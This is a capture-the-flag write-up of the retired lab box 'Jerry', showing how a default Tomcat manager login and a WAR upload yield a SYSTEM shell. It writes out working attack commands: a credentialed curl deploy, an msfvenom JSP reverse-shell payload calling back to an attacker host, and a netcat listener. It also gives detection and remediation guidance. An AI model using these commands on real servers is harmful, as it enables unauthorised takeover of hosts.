Case File #002 — declassified on retirement

Jerry

A default Tomcat manager login and an unrestricted WAR upload turn a stock Apache Tomcat install into a full SYSTEM shell.

Declassifiedon retirement

00 Why this box matters

Jerry looks trivial on paper — one open port, one login page — but it's a near-perfect model of how real breaches happen: not through zero-days, but through default credentials left on an admin interface that never should have been internet-facing. Apache Tomcat's Manager application is designed to let an operator deploy applications remotely. If that operator interface is reachable and guarded by a weak or default password, it becomes a one-step path from anonymous HTTP access to arbitrary code execution as the service account — in this case, NT AUTHORITY\SYSTEM.

01 Recon

A single web service was exposed. Fingerprinting it immediately identified the stack and the presence of the built-in management console.

 nmap
$ nmap -sC -sV -p- 10.10.10.95
# trimmed
PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-title: Apache Tomcat/7.0.88

Browsing to the root page showed the default Tomcat splash screen, which links directly to /manager/html — the Tomcat Web Application Manager.

02 Weak credentials on the manager console
Mechanism first

Tomcat's manager application is protected by HTTP Basic Auth against roles defined in tomcat-users.xml. Many installs ship with sample or documented default combinations (e.g. tomcat:s3cret) that are never changed post-install. This is a class of failure — authentication relying on secrets that were never actually secret — not a code vulnerability at all.

The credentials guessed here came straight from Tomcat's well-known default/sample lists and worked without any lockout or rate limiting in place.

 manager login
$ curl -u tomcat:s3cret http://10.10.10.95:8080/manager/html
# 200 OK — full manager UI returned, including the WAR deploy form
03 Malicious WAR upload → reverse shell
Mechanism first

The Tomcat Manager's deploy feature exists to let an authenticated operator drop a packaged web application (a WAR file) directly onto the running server, where it is auto-exploded and served. There is no distinction enforced between a "legitimate" WAR and one containing a JSP web shell — the upload path itself is the vulnerability once an attacker holds valid manager credentials. Any JSP placed inside the archive executes with the privileges of the Tomcat service process.

  1. Generate a malicious WAR. A JSP reverse-shell payload was packaged into a valid WAR archive using msfvenom.
  2. Deploy it through the manager UI. Uploaded via the "WAR file to deploy" form on the authenticated manager page.
  3. Trigger it. Visiting the newly deployed application path executed the embedded JSP.
 payload
$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f war -o shell.war

$ curl -u tomcat:s3cret -T shell.war \
    "http://10.10.10.95:8080/manager/text/deploy?path=/shell"

$ nc -lvnp 4444
# browse to http://10.10.10.95:8080/shell/ to trigger the JSP
listening on [any] 4444 ...
connect to [10.10.14.5] from (UNKNOWN) [10.10.10.95] 49xxx
C:\apache-tomcat-7.0.88\bin> whoami
nt authority\system

The shell landed with SYSTEM privileges directly — Tomcat was running as the built-in local system account, so there was no need for a separate privilege-escalation chain. Both user and root (Administrator) flags were readable from the same shell.

05 Detection
  • Alert on repeated 401 responses followed by a 200 on /manager/html — a classic brute-force-then-success pattern.
  • Monitor for PUT/deploy requests to /manager/text/deploy or /manager/html/upload from non-admin source ranges.
  • File-integrity monitoring on the Tomcat webapps/ directory — new .war or exploded application directories appearing outside of a change window is a strong indicator.
  • EDR/process-lineage alerting on java.exe (Tomcat) spawning cmd.exe or powershell.exe — this parent/child relationship is almost never legitimate.
06 Remediation
  • Never expose the Tomcat Manager or Host Manager applications on a public interface; restrict to localhost or an internal management VLAN with an allow-list.
  • Remove default/sample entries from tomcat-users.xml and enforce strong, unique credentials with account lockout on repeated failures.
  • Disable the manager's file-upload/deploy capability in production unless it is strictly required, and pair it with authenticated, audited CI/CD deployment pipelines instead of ad-hoc console uploads.
  • Run the Tomcat service under a least-privilege service account rather than SYSTEM/local admin, so a compromised web app doesn't equal a compromised host.

Jerry is a reminder that the flashiest vulnerabilities aren't the ones that get exploited most often — it's the admin console with a sample password nobody rotated, and the deploy button that trusts whatever file arrives. Harden the boring stuff first.
